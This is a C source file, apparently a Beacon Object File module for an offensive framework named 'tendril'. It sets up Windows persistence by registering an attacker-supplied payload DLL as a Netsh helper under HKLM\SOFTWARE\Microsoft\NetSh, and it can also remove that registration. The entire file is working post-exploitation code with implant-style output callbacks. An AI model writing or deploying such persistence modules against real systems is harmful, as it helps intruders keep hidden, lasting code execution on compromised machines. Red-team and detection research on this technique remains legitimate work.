/*
 * tendril-netsh-helper BOF
 * Netsh helper DLL persistence
 *
 * Arguments (packed):
 *   wstr name      - registry value name (e.g. L"nettrace")
 *   wstr dllPath   - payload DLL path
 *   short action   - 0 = install, 1 = remove
 */
#include "tendril.h"

#define NETSH_PATH L"SOFTWARE\\Microsoft\\NetSh"

void go(char* args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int nLen, dLen;
    wchar_t* name    = (wchar_t*)BeaconDataExtract(&parser, &nLen);
    wchar_t* dllPath = (wchar_t*)BeaconDataExtract(&parser, &dLen);
    short action     = BeaconDataShort(&parser);

    if (action == 0) /* install */
    {
        LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, NETSH_PATH, name, dllPath);
        if (s == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Netsh helper registered: %ls -> %ls", name, dllPath);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed (admin?): %d", s);
    }
    else /* remove */
    {
        tendril_reg_delete_value(HKEY_LOCAL_MACHINE, NETSH_PATH, name);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Netsh helper removed: %ls", name);
    }
}
